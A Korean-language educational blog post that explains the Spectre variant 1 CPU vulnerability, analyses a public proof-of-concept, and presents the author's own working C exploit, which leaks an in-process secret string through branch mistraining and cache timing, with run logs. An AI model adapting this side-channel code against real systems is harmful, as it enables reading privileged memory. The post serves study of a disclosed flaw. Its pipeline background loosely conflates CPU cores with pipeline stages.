# Spectre 취약점 분석

## Background

### Pipeline

`파이프라인`은 CPU 자원을 효율적으로 사용하기 위해 고안된 기법입니다. CPU는 명령어를 처리하기 위해 다음과 같이 세 단계를 거칩니다.

1. Fetch
2. Decode
3. Execute

명령어를 가져와서(Fetch) 해독(Decode)하고 실행(Execute)하는 것입니다. 예를 들어 4개의 코어를 가진 CPU가 명령어를 처리한다고 하는 과정을 살펴봅시다. 어떤 한 코어에서 하나의 명령어가 처리될 때까지 나머지 3개의 코어가 아무 작업을 하지 않고 기다리고 있다면 이는 비효율적입니다. 이러한 비효율성을 해결하기 위해 등장한 것이 `파이프라인`인 것입니다. 어떤 한 코어에서 a라는 명령어를 처리하는 동안 나머지 3개의 코어에서는 b, c, d 명령어를 위의 3가지 단계로 각각 처리하는 것입니다.

### Branch prediction

`파이프라인`이 수행되다가 분기점을 만나게 되면 문제점이 발생합니다. 앞에서 처리되고 있는 데이터를 받아와야만 어디로 분기할지를 판단할 수 있는데 이것이 불가능한 경우가 발생하는 것입니다. 앞의 명령어가 처리되기까지 기다리는 것은 비효율적입니다. 이러한 비효율성을 개선하기 위해 등장한 것이 `분기 예측`입니다. 분기를 예측하여 미리 명령어를 처리하는 것입니다. 만약 분기가 맞아 떨어진다면 효율적일 것입니다. 반면, 분기 예측에 실패한 경우에는 분기 예측을 통해 처리한 명령어들을 취소(롤백)한 후 다시 명령어를 처리합니다. 분기 예측에 실패한 경우에는 비효율성이 높아지긴 하지만 분기 예측에 성공하는 경우도 있으므로 앞서 설명했던 방식보다는 효율적인 것입니다.

### Cache hit

CPU가 데이터를 처리할 때 저장되어 있던 데이터를 가져와서 쓰게 됩니다. 데이터 저장 장치는 크게 4가지로 분류할 수 있습니다. 레지스터, 캐시 메모리, 일반 메모리, 하드디스크가 바로 그것입니다. CPU는 이들 장치를 통해 데이터를 처리하는데 그 처리 속도는 레지스터, 캐시 메모리, 일반 메모리, 하드디스크 순으로 빠릅니다. CPU가 데이터를 요청했을 때 첫째로 캐시 메모리를 확인하게 됩니다. 캐시 메모리에 해당 데이터가 있다면 이를 가져와서 사용하게 되는데 이 과정을 바로 `캐시 히트`라고 부릅니다. 반면 캐시 메모리에 해당 데이터가 없다면 일반 메모리에서 가져오는 과정을 거쳐야 합니다. 이 과정을 `캐시 미스`라고 부릅니다.

### Cache timing attack

`Cache timing attack`은 `Side channel attack`의 한 종류로 볼 수 있습니다. CPU가 데이터를 처리할 때 캐시 히트를 통해 처리한다면 그 처리 속도는 빠를 것입니다. 반면 캐시 미스가 발생하여 일반 메모리에서 데이터를 가져와서 처리한다면 그 속도는 비교적 느릴 것입니다. 이런 시간 차를 활용하는 것이 바로 `Cache timing attack`입니다.

## Concept of Spectre

```c
if (x < array1_size) {
	temp &= array2[array1[x] * 512];
}
```

위 코드에서 x 값이 범위를 초과한다면 `x < array1_size` 필터링에 의해 `temp &= array2[array1[x] * 512]`가 실행되지 않을 것입니다. 하지만 마이크로 아키텍처 관점에서는 `Out-of-Execution`로 인해서 x 값이 범위를 초과하더라도  `temp &= array2[array1[x] * 512]`가 실행되는 경우가 있습니다. 이 경우,  `&array2[array1[x] * 512]`이 캐시에 올라갈 것이며 이를 통한 캐시 타이밍 어택이 가능해집니다.

x의 값에 `(privilege memory의 주소값 - array1의 base 주소값)`이 담긴다면 `array1[x]`에는 `privilege memory의 값`이 담길 것이며 캐시에는 `array2[array1[x] * 512]` 값이 남게 됩니다. 이제 유저 모드에서 캐시에 남은 이 값을 참조해보면서 걸리는 시간을 계산해본다면 캐시 타이밍 어택이 가능할 것입니다.

## PoC Analysis

\* `https://github.com/crozone/SpectrePoC`의 PoC를 분석했습니다. 아래 내용은 PoC 코드와 함께 보시는 것을 추천드립니다.

```c
  #ifndef NORDTSCP
    printf("RDTSCP_SUPPORTED ");
  #else
    printf("RDTSCP_NOT_SUPPORTED ");
  #endif
  #ifndef NOMFENCE
    printf("MFENCE_SUPPORTED ");
  #else
    printf("MFENCE_NOT_SUPPORTED");
  #endif
  #ifndef NOCLFLUSH
    printf("CLFLUSH_SUPPORTED ");
  #else
    printf("CLFLUSH_NOT_SUPPORTED ");
  #endif
```

위처럼 전처리문을 많이 볼 수 있습니다. 이는 아키텍처마다 지원하는 instruction이 달라서 넣어준 것입니다. 컴파일 시에 이를 설정해줄 수 있습니다.

```c
size_t malicious_x = (size_t)(secret - (char * ) array1);
```

`malicious_x`에는 `(가져올 값의 주소 - array1의 베이스 주소)`가 담깁니다. 여기서 `secret`은 `char * secret = "The Magic Words are Squeamish Ossifrage.";`와 같이 전역 변수로 선언되어 있습니다. 본 PoC는 스펙터 공격을 이용하여 이 값을 하나하나씩 가져오는 코드입니다.

스펙터를 이용하여 값을 하나씩 추정해오는 `readMemoryByte` 함수가 핵심 함수입니다.

```c
/* Flush array2[256*(0..255)] from cache */
for (i = 0; i < 256; i++)
  _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
training_x = tries % array1_size;
for (j = 29; j >= 0; j--) {
  #ifndef NOCLFLUSH
  _mm_clflush( & array1_size);
```

flush를 진행합니다. 이는 side channel attack의 한 종류인 캐시 타이밍 어택을 위한 사전 최적화 작업입니다.

```c
x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
x = training_x ^ (x & (malicious_x ^ training_x));
```

위는 x의 값을 임의로 연산시키면서 branch prediction에 혼란을 주는 코드입니다. x 값에는 결국 `malicious_x`의 값이 들어갑니다. 이 코드가 없으면 분기 예측 기능 때문에 아래의 코드에서 `temp &= array2[array1[x] * 512];` 부분이 실행되지 않아서 `array2[array1[x] * 512]` 값이 캐시에 올라가지 않습니다. 

```c
if (x < array1_size) {
	temp &= array2[array1[x] * 512];
}
```

이후에 `victim_function(x)` 함수를 호출하게 되면 위의 코드가 실행되면서 캐시에 `array2[array1[x] * 512]` 값이 올라갑니다. 

```c
for (i = 0; i < 256; i++) {
	mix_i = ((i * 167) + 13) & 255;
	addr = & array2[mix_i * 512];

	time1 = __rdtscp( & junk); /* READ TIMER */
	junk = * addr; /* MEMORY ACCESS TO TIME */
	time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

	_mm_mfence();
	time1 = __rdtsc(); /* READ TIMER */
	_mm_mfence();
	junk = * addr; /* MEMORY ACCESS TO TIME */
	_mm_mfence();
	time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
	_mm_mfence();
	
	if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
		results[mix_i]++; /* cache hit - add +1 to score for this value */
}
```

`victim_function(x)` 함수 호출 후에는 256(1바이트의 크기)번 반복을 돌면서 시간 차를 체크합니다. 이를 통해 `cache hit`가 발생하는지를 확인합니다.

```c
j = k = -1;
for (i = 0; i < 256; i++) {
  if (j < 0 || results[i] >= results[j]) {
    k = j;
    j = i;
  } else if (k < 0 || results[i] >= results[k]) {
    k = i;
  }
}
if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
  break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
```

이 부분은 캐시 히트가 몇번 발생했는지를 확인하여 캐시히트가 가장 많이 발생한 값과 둘째로 많이 발생한 값을 j와 k에 차례로 담게 됩니다.

이러한 과정을 거쳐 다음과 같이 값을 추정해올 수 있습니다.

### 실행 결과

```
$ ./spectre.out 
Using a cache hit threshold of 80.
Build: RDTSCP_SUPPORTED MFENCE_SUPPORTED CLFLUSH_SUPPORTED 
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffdfec68... Unclear: 0x54=’T’ score=999 (second best: 0x01=’?’ score=808)
Reading at malicious_x = 0xffffffffffdfec69... Unclear: 0x68=’h’ score=996 (second best: 0x01=’?’ score=803)
Reading at malicious_x = 0xffffffffffdfec6a... Unclear: 0x65=’e’ score=992 (second best: 0x01=’?’ score=768)
Reading at malicious_x = 0xffffffffffdfec6b... Unclear: 0x20=’ ’ score=998 (second best: 0x01=’?’ score=788)
Reading at malicious_x = 0xffffffffffdfec6c... Unclear: 0x4D=’M’ score=967 (second best: 0x01=’?’ score=799)
Reading at malicious_x = 0xffffffffffdfec6d... Unclear: 0x61=’a’ score=991 (second best: 0x01=’?’ score=730)
Reading at malicious_x = 0xffffffffffdfec6e... Unclear: 0x67=’g’ score=964 (second best: 0x01=’?’ score=686)
Reading at malicious_x = 0xffffffffffdfec6f... Unclear: 0x69=’i’ score=953 (second best: 0x01=’?’ score=713)
Reading at malicious_x = 0xffffffffffdfec70... Unclear: 0x63=’c’ score=990 (second best: 0x01=’?’ score=742)
Reading at malicious_x = 0xffffffffffdfec71... Unclear: 0x20=’ ’ score=952 (second best: 0x01=’?’ score=686)
Reading at malicious_x = 0xffffffffffdfec72... Unclear: 0x57=’W’ score=996 (second best: 0x01=’?’ score=798)
Reading at malicious_x = 0xffffffffffdfec73... Unclear: 0x6F=’o’ score=993 (second best: 0x01=’?’ score=767)
Reading at malicious_x = 0xffffffffffdfec74... Unclear: 0x72=’r’ score=997 (second best: 0x01=’?’ score=757)
Reading at malicious_x = 0xffffffffffdfec75... Unclear: 0x64=’d’ score=990 (second best: 0x01=’?’ score=775)
Reading at malicious_x = 0xffffffffffdfec76... Unclear: 0x73=’s’ score=999 (second best: 0x01=’?’ score=793)
Reading at malicious_x = 0xffffffffffdfec77... Unclear: 0x20=’ ’ score=995 (second best: 0x01=’?’ score=742)
Reading at malicious_x = 0xffffffffffdfec78... Unclear: 0x61=’a’ score=961 (second best: 0x01=’?’ score=775)
Reading at malicious_x = 0xffffffffffdfec79... Unclear: 0x72=’r’ score=999 (second best: 0x01=’?’ score=775)
Reading at malicious_x = 0xffffffffffdfec7a... Unclear: 0x65=’e’ score=995 (second best: 0x01=’?’ score=784)
Reading at malicious_x = 0xffffffffffdfec7b... Unclear: 0x20=’ ’ score=995 (second best: 0x01=’?’ score=729)
Reading at malicious_x = 0xffffffffffdfec7c... Unclear: 0x53=’S’ score=997 (second best: 0x01=’?’ score=768)
Reading at malicious_x = 0xffffffffffdfec7d... Unclear: 0x71=’q’ score=995 (second best: 0x01=’?’ score=727)
Reading at malicious_x = 0xffffffffffdfec7e... Unclear: 0x75=’u’ score=997 (second best: 0x01=’?’ score=734)
Reading at malicious_x = 0xffffffffffdfec7f... Unclear: 0x65=’e’ score=991 (second best: 0x01=’?’ score=773)
Reading at malicious_x = 0xffffffffffdfec80... Unclear: 0x61=’a’ score=939 (second best: 0x01=’?’ score=668)
Reading at malicious_x = 0xffffffffffdfec81... Unclear: 0x6D=’m’ score=986 (second best: 0x01=’?’ score=748)
Reading at malicious_x = 0xffffffffffdfec82... Unclear: 0x69=’i’ score=833 (second best: 0x01=’?’ score=775)
Reading at malicious_x = 0xffffffffffdfec83... Unclear: 0x73=’s’ score=993 (second best: 0x01=’?’ score=777)
Reading at malicious_x = 0xffffffffffdfec84... Unclear: 0x68=’h’ score=998 (second best: 0x01=’?’ score=765)
Reading at malicious_x = 0xffffffffffdfec85... Unclear: 0x20=’ ’ score=951 (second best: 0x01=’?’ score=696)
Reading at malicious_x = 0xffffffffffdfec86... Unclear: 0x4F=’O’ score=999 (second best: 0x01=’?’ score=773)
Reading at malicious_x = 0xffffffffffdfec87... Unclear: 0x73=’s’ score=998 (second best: 0x01=’?’ score=760)
Reading at malicious_x = 0xffffffffffdfec88... Unclear: 0x73=’s’ score=995 (second best: 0x01=’?’ score=736)
Reading at malicious_x = 0xffffffffffdfec89... Unclear: 0x69=’i’ score=992 (second best: 0x01=’?’ score=795)
Reading at malicious_x = 0xffffffffffdfec8a... Unclear: 0x66=’f’ score=914 (second best: 0x01=’?’ score=644)
Reading at malicious_x = 0xffffffffffdfec8b... Unclear: 0x72=’r’ score=834 (second best: 0x01=’?’ score=751)
Reading at malicious_x = 0xffffffffffdfec8c... Unclear: 0x61=’a’ score=983 (second best: 0x01=’?’ score=758)
Reading at malicious_x = 0xffffffffffdfec8d... Unclear: 0x67=’g’ score=996 (second best: 0x01=’?’ score=750)
Reading at malicious_x = 0xffffffffffdfec8e... Unclear: 0x65=’e’ score=977 (second best: 0x01=’?’ score=742)
Reading at malicious_x = 0xffffffffffdfec8f... Unclear: 0x2E=’.’ score=993 (second best: 0x01=’?’ score=813)
```

사양이 낮은 가상환경에서 테스트 되어 시간 차가 그리 많이 나지 않습니다. 이 때문에 Unclear라고 뜨지만 실제로 값을 제대로 추정한 것은 확인할 수 있습니다.

## PoC 작성

### 1차 작성 코드

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

unsigned int array1_size = 16;
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t array2[256 * 512];

char * secret = "My secret";

uint8_t temp = 0;

void specu(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

extern void clflush(void *);
asm(
".section .text\n"
".global clflush\n"
"clflush:\n"
" mfence\n"
" clflush (%rdi)\n"
" retq\n"
);

int main(int argc, char ** argv) {
  static int results[256] = {0,};
  int tries = 999, i, j, mix_i, junk = 0;
  volatile uint8_t * addr;
  size_t training_x, x;
  size_t malicious_x = (size_t)(secret - (char * ) array1);

  for (i = 0; i < sizeof(array2); i++) {
    array2[i] = 1;
  }

  for (i = 0; i < 256; i++)
    clflush(&array2[i * 512]);

  training_x = tries % array1_size;
  for (j = 29; j >= 0; j--) {
    clflush(&array1_size);

    for (volatile int z = 0; z < 100; z++) {}

    x = ((j % 6) - 1) & ~0xFFFF;
    x = (x | (x >> 16));
    x = training_x ^ (x & (malicious_x ^ training_x));
    // OoE를 트리거 하기 위한 쓸데 없는 연산임. 결국 x = malicious_x

    specu(x);
  }

  unsigned long long t, t1, t2;
  int min = 99999, min_val;

  for (i = 0; i < 256; i++) {
    addr = & array2[i * 512];
    t1 = __rdtscp(&junk);
    junk = *addr;
    t2 = __rdtscp(&junk);
    t = t2-t1;
    if (t < min) {
      min = t;
      min_val = i;
    }
    printf("%0d ", t);
  }
  results[0] ^= junk;
  puts("");
  printf("%02x[%c] : %d\n", min_val, min_val, min);
  return 0;
}
```

위 코드를 실행하면 secret의 첫 글자인 M이 나와야 할 것입니다.

### 실행결과

```
delspon@ubuntu:~/labs/practice/spectre$ ./poc
102 94 226 270 302 256 234 230 66 232 230 248 236 410 244 244 216 296 266 232 732 236 364 244 788 286 318 290 418 304 352 222 338 252 638 246 242 216 242 226 224 216 250 230 488 302 226 658 226 298 340 288 262 228 268 236 288 360 392 284 262 242 254 230 310 324 304 332 546 228 288 262 530 582 232 248 230 44 246 318 336 450 246 232 270 228 274 226 258 214 236 226 262 230 230 270 480 254 486 708 236 290 230 228 232 234 222 254 232 250 232 216 282 222 314 258 294 224 330 306 364 294 276 754 250 238 306 514 230 276 244 850 240 218 232 224 224 252 274 226 226 278 244 226 230 410 248 364 362 358 302 372 304 310 294 214 234 230 234 666 236 298 356 312 296 238 242 220 230 272 768 742 324 390 298 242 222 300 272 234 238 268 232 216 224 296 224 258 242 248 242 230 880 412 252 232 260 304 238 324 232 228 242 266 234 280 262 236 280 218 342 338 270 260 236 390 260 234 224 240 216 286 266 378 354 338 436 342 250 322 246 278 220 216 648 242 278 354 532 364 236 328 258 222 230 362 230 250 238 228 234 384 228 294 390 388 
4d[M] : 44
delspon@ubuntu:~/labs/practice/spectre$ ./poc
80 86 280 282 460 246 232 384 80 230 278 266 310 230 252 270 366 304 228 674 232 288 236 376 238 286 224 424 350 362 376 306 422 232 520 282 398 280 254 276 574 236 254 224 250 386 250 466 350 250 640 234 486 250 258 230 326 234 278 454 332 574 242 244 268 234 224 226 244 296 368 224 258 396 286 356 316 44 298 512 1014 258 700 226 264 266 380 290 696 260 268 290 238 234 236 228 344 242 250 822 312 342 294 400 246 244 246 372 228 770 242 228 232 270 370 224 298 228 250 246 336 270 406 244 314 264 282 384 224 228 230 256 254 806 248 258 256 292 244 308 230 242 276 226 324 338 248 360 254 736 236 284 246 388 234 230 242 300 244 314 358 226 300 330 268 362 274 226 294 360 250 356 306 250 242 236 316 270 464 228 232 226 238 416 272 302 326 864 264 348 324 226 240 220 260 276 238 262 254 220 250 508 294 406 292 360 386 330 236 230 266 190 186 224 240 230 230 248 242 278 250 234 236 230 488 254 476 716 340 626 256 250 262 236 238 248 280 238 294 320 254 226 226 232 254 230 262 356 412 242 256 378 230 422 294 254 
4d[M] : 44
delspon@ubuntu:~/labs/practice/spectre$ ./poc
78 366 250 250 286 216 274 220 44 236 488 292 246 288 356 270 308 272 446 336 400 368 254 242 244 262 248 574 456 256 254 312 384 244 244 234 338 382 370 254 218 254 294 252 514 266 768 230 228 234 244 318 364 282 250 256 424 424 258 288 262 236 308 228 236 264 252 248 226 250 318 778 424 228 268 258 290 40 742 234 350 462 282 584 380 232 248 228 224 224 306 364 226 574 346 712 354 218 296 224 342 266 524 282 306 422 366 224 314 232 412 336 292 228 234 852 324 220 298 252 856 240 242 264 380 228 242 440 328 1174 912 228 244 224 370 232 328 220 232 300 258 356 284 304 294 344 318 280 216 236 292 290 372 350 326 390 330 512 256 230 232 278 254 294 318 274 300 360 224 228 458 358 216 226 236 228 252 228 226 242 298 272 416 236 256 244 230 958 332 234 366 252 234 290 332 316 292 266 804 278 250 250 262 274 242 256 318 362 230 232 226 240 246 244 310 286 330 302 364 230 270 234 864 264 278 324 250 260 378 304 246 362 256 234 260 238 738 234 402 374 372 298 306 250 286 234 270 410 306 324 294 406 258 354 604 834 
4d[M] : 40
delspon@ubuntu:~/labs/practice/spectre$ ./poc
78 78 706 264 272 214 708 222 46 258 458 1058 424 392 978 568 218 334 228 250 236 228 280 282 264 246 236 218 226 658 266 320 244 222 270 224 230 520 312 348 348 310 278 358 304 258 332 234 286 254 344 242 248 224 234 412 236 306 306 394 308 230 258 276 318 330 296 384 312 298 370 280 266 288 234 662 226 68 242 252 226 364 252 316 278 496 414 306 364 360 334 378 216 380 336 232 312 240 230 242 244 222 294 234 396 324 338 296 310 650 538 256 280 240 226 258 256 324 248 228 234 218 258 370 224 258 226 346 252 468 242 372 344 348 362 264 260 222 230 258 264 238 242 330 382 284 228 372 256 236 248 288 224 228 290 244 226 274 244 258 288 230 242 236 244 820 340 230 258 352 290 368 232 396 270 330 270 308 270 230 224 494 234 330 372 518 354 302 340 254 236 220 444 240 262 240 230 386 244 464 286 392 264 294 234 298 280 222 222 224 288 380 314 294 320 260 298 228 240 970 662 230 382 306 252 242 336 226 234 256 240 634 228 254 230 230 226 216 400 230 252 280 256 240 376 402 302 230 236 230 784 228 240 252 234 256 
08] : 46
delspon@ubuntu:~/labs/practice/spectre$ ./poc
80 86 350 230 254 262 270 386 68 292 390 266 376 464 236 240 276 250 342 308 438 318 254 340 226 270 458 282 240 234 238 296 364 864 606 232 446 278 406 448 238 492 624 474 322 416 298 286 602 370 244 552 516 242 304 228 290 278 250 350 318 266 378 490 254 288 372 238 254 350 354 230 824 420 242 264 238 42 318 264 364 252 584 486 614 310 316 284 298 224 514 262 260 230 344 316 290 298 248 314 384 418 248 236 248 230 266 238 230 266 310 218 338 238 280 292 296 370 256 392 276 240 264 304 258 344 282 242 240 228 236 270 258 256 334 222 626 594 238 294 254 386 234 278 290 328 242 498 298 480 354 236 226 266 288 360 406 254 458 284 228 264 278 830 356 368 258 250 248 256 822 594 244 250 316 218 244 226 242 266 242 294 324 328 234 240 386 242 228 668 686 306 292 362 294 268 298 256 354 264 248 256 302 378 382 340 298 304 306 256 298 302 304 280 350 238 308 346 274 254 232 240 300 386 252 314 302 322 542 326 284 284 230 388 378 326 850 226 370 1014 228 498 330 368 342 506 252 236 362 228 310 224 260 288 452 748 
4d[M] : 42
```

실제로 실행해본 결과, noise가 섞이긴 했지만 M이라는 값이 가장 많이 나왔습니다. 노이즈는 최적화의 문제이며 통계의 개념을 도입한다면 해결할 수 있습니다.

## Reference

https://meltdownattack.com/

https://googleprojectzero.blogspot.kr/2018/01/reading-privileged-memory-with-side.html
